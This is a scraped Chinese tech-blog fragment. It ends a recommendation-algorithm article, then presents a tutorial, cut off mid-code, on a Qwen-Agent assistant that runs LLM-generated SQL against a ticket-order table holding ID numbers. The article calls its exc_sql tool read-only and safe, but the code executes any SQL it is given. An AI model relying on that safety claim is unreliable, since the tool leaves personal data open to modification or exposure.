style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.086em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span></span></span></span></span></div>
<h5 data-id="heading-18">单点加权推荐</h5>
<p>针对多兴趣用户，寻找与<strong>特定喜好物品最相似</strong>的推荐。单点加权策略保留了用户交互历史中每一个物品的独立特征。它认为用户的兴趣并非单一的聚合点，而是分布在潜在空间中的多个<strong>离散坐标点</strong>。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mo>∗</mo></msup><mo>=</mo><msub><mtext>argmax</mtext><mi>y</mi></msub><mrow><mo fence="true">{</mo><mtext>USim</mtext><mo stretchy="false">(</mo><msub><mi>v</mi><mi>y</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>x</mi></msub><mo stretchy="false">)</mo><mo>⋅</mo><msub><mi>r</mi><mi>x</mi></msub><mo>∣</mo><mi>y</mi><mo>∈</mo><mtext>Items</mtext><mo separator="true">,</mo><msub><mi>v</mi><mi>x</mi></msub><mo>∈</mo><mi mathvariant="script">A</mi><mo fence="true">}</mo></mrow></mrow><annotation encoding="application/x-tex">y^* = \text{argmax}_{y} \left\{ \text{USim}(v_y, v_x) \cdot r_x \mid y \in \text{Items}, v_x \in \mathcal{A} \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9331em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1302em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord text"><span class="mord">argmax</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.0573em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord text"><span class="mord">USim</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord text"><span class="mord">Items</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathcal">A</span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span></span></div>
<h5 data-id="heading-19">Top-K 覆盖</h5>
<p>对用户喜欢的不同物品分别执行搜索，获取 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 个多样化结果。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>S</mi><mo>=</mo><munder><mo>⋃</mo><mrow><mi>x</mi><mo>∈</mo><msub><mi mathvariant="script">R</mi><mi>A</mi></msub></mrow></munder><munder><mrow><mi mathvariant="normal">top-k</mi><mo>⁡</mo></mrow><mrow><mi>y</mi><mo>∈</mo><mtext>Items</mtext></mrow></munder><mrow><mo fence="true">(</mo><mtext>USim</mtext><mo stretchy="false">(</mo><msub><mi>v</mi><mi>y</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>x</mi></msub><mo stretchy="false">)</mo><mo>⋅</mo><msub><mi>r</mi><mi>x</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">S = \bigcup_{x \in \mathcal{R}_A} \operatorname*{top-k}_{y \in \text{Items}} \left( \text{USim}(v_y, v_x) \cdot r_x \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4446em;vertical-align:-1.3946em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8557em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1433em;"><span/></span></span></span></span></span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">⋃</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3946em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-2.1612em;margin-left:0em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord text mtight"><span class="mord mtight">Items</span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span><span class="mop"><span class="mord mathrm">top-k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0749em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord text"><span class="mord">USim</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></div>
<h4 data-id="heading-20">最近邻搜索</h4>
<p>在完成物品向量化后，推荐系统面临的核心工程问题是如何从数百万甚至数亿个物品向量中快速找到与目标向量最相似的项。精确最近邻搜索需要计算目标向量与全量库中每个向量的距离，其<strong>计算复杂度随库规模呈线性增长</strong>，无法满足在线实时推荐的延迟要求。</p>
<p>为了平衡精度与速度，工程实践中普遍采用**近似最近邻（Approximate Nearest Neighbors ANN）**搜索算法，通过索引结构（如量化、聚类或图结构）缩小搜索范围，仅返回物理距离极其接近（而非绝对最近）的结果。ANN 算法能以极微小的精度损失换取数个数量级的执行速度提升。在任何需要执行 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>argmax</mtext></mrow><annotation encoding="application/x-tex">\text{argmax}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord text"><span class="mord">argmax</span></span></span></span></span></span> 或 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>argmin</mtext></mrow><annotation encoding="application/x-tex">\text{argmin}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8623em;vertical-align:-0.1944em;"/><span class="mord text"><span class="mord">argmin</span></span></span></span></span></span> 运算的大规模向量检索场景中，ANN 均是实际的底层实现支柱。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Function Calling案例：可视化的一站式数据助手]]></title>    <link>https://juejin.cn/post/7596971669862531113</link>    <guid>https://juejin.cn/post/7596971669862531113</guid>    <pubDate>2026-01-20T01:08:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596971669862531113" data-draft-id="7595358285722206217" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Function Calling案例：可视化的一站式数据助手"/> <meta itemprop="keywords" content="后端,人工智能,Python"/> <meta itemprop="datePublished" content="2026-01-20T01:08:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="星浩AI"/> <meta itemprop="url" content="https://juejin.cn/user/2904236059009760"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Function Calling案例：可视化的一站式数据助手
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2904236059009760/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    星浩AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:08:21.000Z" title="Tue Jan 20 2026 01:08:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>“4月到6月，一日票和二日票每周卖了多少？哪个渠道卖得最好？” 这是运营同事每天都要手动查表、拼Excel、画图才能回答的问题。既浪费时间，又无法确保准确性。</p>
</blockquote>
<p>有没有可能，像聊天一样问一句，就自动得到答案和可视化结果？</p>
<p><strong>现在，有了。</strong></p>
<h3 data-id="heading-0">🎯 打造“会查数据库还会画图”的门票助手</h3>
<p>这个助手不需要你写 SQL、不用打开 Excel。你只需用自然语言提问，比如：</p>
<ul>
<li>“4 到 6 月每周卖了多少一日票和二日票？”</li>
<li>“哪个销售渠道的入园人数最多？”</li>
<li>“上个月北京用户买了多少张折扣票？”</li>
</ul>
<p>它会自动完成以下流程：</p>
<ol>
<li><strong>理解意图</strong>→ 2.<strong>生成精准 SQL</strong>→ 3.<strong>查询真实订单库</strong>→ 4.<strong>返回结构化结果 + 自动绘图</strong></li>
</ol>
<blockquote>
<p>💡一句话：让数据自己说话。</p>
</blockquote>
<h3 data-id="heading-1">📋 方案总览：一个「会查库 + 会画图」的门票助手</h3>
<p>整体架构可以拆解为<strong>4 个关键组件</strong>：</p>

























<table><thead><tr><th>组件</th><th>职责说明</th></tr></thead><tbody><tr><td>LLM（门票助手大脑）</td><td>基于 Qwen，通过 system prompt 理解表结构、SKU 规则和常见查询意图</td></tr><tr><td>Function Calling（工具调用层）</td><td>借助Assistant的function_list机制，把 LLM 生成的 SQL 交给工具执行</td></tr><tr><td>SQL 工具exc_sql（数据访问层）</td><td>与 MySQL 8.0 连接，只读执行查询，返回 Markdown 表格（以及后续扩展的图表）</td></tr><tr><td>WebUI / 终端交互（展示层）</td><td>为运营/业务同学提供聊天式界面，直接看到表格和图表结果</td></tr></tbody></table>
<h3 data-id="heading-2">⚡ 快速开始</h3>
<p>在开始搭建之前，需要先完成环境准备：</p>
<h4 data-id="heading-3">1. 安装依赖</h4>
<pre><code class="hljs language-text" lang="text">dashscope==1.22.1
matplotlib==3.10.3
numpy==2.3.0
pandas==2.3.0
qwen_agent==0.0.25
scikit_learn==1.7.0
SQLAlchemy==2.0.23
qwen_agent==0.0.19
</code></pre>
<pre><code class="hljs language-bash" lang="bash">pip install -r requirements.txt
</code></pre>
<h4 data-id="heading-4">2. 配置数据库连接</h4>
<p>确保已安装并启动 MySQL 8.0 数据库，创建<code>tkt_orders</code>表并导入示例数据。</p>
<p>修改<code>get_engine()</code>函数中的数据库连接信息（详见下方代码解析部分）。</p>
<h4 data-id="heading-5">3. 配置 API Key</h4>
<p>确保已配置 Qwen API Key，可通过环境变量设置：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> DASHSCOPE_API_KEY=<span class="hljs-string">'your-api-key'</span>
</code></pre>
<h3 data-id="heading-6">🚀 实现方案与搭建流程</h3>
<p>从工程视角看，整个门票助手可以拆成几个清晰的步骤：先用 system prompt「教会」模型业务表结构和口径，再通过 function calling 接上只读 SQL 工具，最后用 WebUI 暴露给运营同学使用。</p>
<h4 data-id="heading-7">Step 1：系统初始化</h4>
<ul>
<li>设置系统 prompt，描述门票表结构和常见查询需求</li>
<li>注册 SQL 查询工具（<code>exc_sql</code>），用于执行数据查询</li>
</ul>
<h4 data-id="heading-8">Step 2：助手实例化</h4>
<p>使用 Qwen-Agent 的<code>Assistant</code>类，加载 LLM 配置、system prompt 和<code>function_list</code>（只包含<code>exc_sql</code>）。</p>
<h4 data-id="heading-9">Step 3：设置交互模式</h4>
<ul>
<li>选择 WebUI 模式，用户通过网页输入问题，助手自动完成 SQL 查询并返回结果</li>
<li>可以在界面右侧列出常见问题，方便运营「一键点选」</li>
</ul>
<h4 data-id="heading-10">Step 4：Function Call 机制</h4>
<p>完整的调用流程如下：</p>
<ol>
<li><strong>用户输入</strong>：自然语言问题</li>
<li><strong>LLM 解析</strong>：理解意图并自动生成 SQL 查询语句</li>
<li><strong>工具调用</strong>：<code>exc_sql</code>工具被自动调用，执行 SQL 并返回查询结果</li>
<li><strong>结果展示</strong>：通过终端或 WebUI 展示给用户</li>
</ol>
<h3 data-id="heading-11">💻 关键代码解析</h3>
<p>下面几节会从<strong>system prompt</strong>、<strong>工具注册</strong>和<strong>Agent 初始化</strong>三个角度，拆解整个 function calling 流程。</p>
<h4 data-id="heading-12">1、 System Prompt：让模型理解业务</h4>
<p>在实现 function calling 之前，最关键的是让模型<strong>真正理解你的业务表结构和业务口径</strong>。</p>
<p>下面通过<code>system_prompt</code>把门票订单表结构、一日/二日票的 SKU 归并规则以及典型聚合写死在提示词里，给模型一套“业务说明书”。</p>
<pre><code class="hljs language-python" lang="python">system_prompt = <span class="hljs-string">"""我是门票助手，以下是关于门票订单表相关的字段，我可能会编写对应的SQL(运行环境是MySQL8.0)，对数据进行查询
-- 门票订单表
CREATE TABLE tkt_orders (
    order_time DATETIME,             -- 订单日期
    account_id INT,                  -- 预定用户ID
    gov_id VARCHAR(18),              -- 商品使用人ID（身份证号）
    gender VARCHAR(10),              -- 使用人性别
    age INT,                         -- 年龄
    province VARCHAR(30),           -- 使用人省份
    SKU VARCHAR(100),                -- 商品SKU名
    product_serial_no VARCHAR(30),  -- 商品ID
    eco_main_order_id VARCHAR(20),  -- 订单ID
    sales_channel VARCHAR(20),      -- 销售渠道
    status VARCHAR(30),             -- 商品状态
    order_value DECIMAL(10,2),       -- 订单金额
    quantity INT                     -- 商品数量
);
一日门票，对应多种SKU：
Universal Studios Beijing One-Day Dated Ticket-Standard
Universal Studios Beijing One-Day Dated Ticket-Child
Universal Studios Beijing One-Day Dated Ticket-Senior
二日门票，对应多种SKU：
USB 1.5-Day Dated Ticket Standard
USB 1.5-Day Dated Ticket Discounted
一日门票、二日门票查询
SUM(CASE WHEN SKU LIKE 'Universal Studios Beijing One-Day%' THEN quantity ELSE 0 END) AS one_day_ticket_sales,
SUM(CASE WHEN SKU LIKE 'USB%' THEN quantity ELSE 0 END) AS two_day_ticket_sales
我将回答用户关于门票相关的问题
"""</span>
</code></pre>
<h4 data-id="heading-13">2、exc_sql 工具注册：把 SQL 交给「安全的查询工具」</h4>
<p>有了能写 SQL 的模型，还需要一个「只读的 SQL 执行器」。</p>
<p><code>exc_sql</code>工具负责接收模型生成的 SQL，连接 MySQL，并把结果以 Markdown 表格形式返回给 LLM，用于后续解释和可视化。</p>
<h5 data-id="heading-14">数据库连接封装</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_engine</span>():
    <span class="hljs-string">"""
    获取数据库连接 engine
    """</span>
    <span class="hljs-keyword">return</span> create_engine(
        <span class="hljs-string">f'mysql+mysqlconnector://用户名:密码@localhost:3306/数据库名称?charset=utf8mb4'</span>,
        connect_args={<span class="hljs-string">'connect_timeout'</span>: <span class="hljs-number">10</span>}, pool_size=<span class="hljs-number">10</span>, max_overflow=<span class="hljs-number">20</span>
    )
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@register_tool(<span class="hljs-params"><span class="hljs-string">'exc_sql'</span></span>)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ExcSQLTool</span>(<span class="hljs-title class_ inherited__">BaseTool</span>):
    <span class="hljs-string">"""
    SQL查询工具，执行传入的SQL语句并返回结果。
    """</span>
    description = <span class="hljs-string">'对于生成的SQL，进行SQL查询'</span>
    parameters = [{
        <span class="hljs-string">'name'</span>: <span class="hljs-string">'sql_input'</span>,
        <span class="hljs-string">'type'</span>: <span class="hljs-string">'string'</span>,
        <span class="hljs-string">'description'</span>: <span class="hljs-string">'生成的SQL语句'</span>,
        <span class="hljs-string">'required'</span>: <span class="hljs-literal">True</span>
    }]

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">call</span>(<span class="hljs-params">self, params: <span class="hljs-built_in">str</span>, **kwargs</span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-keyword">import</span> json
        args = json.loads(params)
        sql_input = args[<span class="hljs-string">'sql_input'</span>]
        database = args.get(<span class="hljs-string">'database'</span>, <span class="hljs-string">'ubr'</span>)
        <span class="hljs-comment"># 创建数据库连接</span>
        engine = get_engine()
        <span class="hljs-keyword">try</span>:
            df = pd.read_sql(sql_input, engine)
            <span class="hljs-comment"># 返回前10行，防止数据过多</span>
            <span class="hljs-keyword">return</span> df.head(<span class="hljs-number">10</span>).to_markdown(index=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">return</span><span class="hljs-string">f"SQL执行出错: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>
</code></pre>
<h5 data-id="heading-15">函数描述：让 LLM 知道「工具长什么样」</h5>
<pre><code class="hljs language-python" lang="python">functions_desc = [
    {
        <span class="hljs-string">"name"</span>: <span class="hljs-string">"exc_sql"</span>,
        <span class="hljs-string">"description"</span>: <span class="hljs-string">"对于生成的SQL，进行SQL查询"</span>,
        <span class="hljs-string">"parameters"</span>: {
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"object"</span>,
            <span class="hljs-string">"properties"</span>: {
                <span class="hljs-string">"sql_input"</span>: {
                    <span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span>,
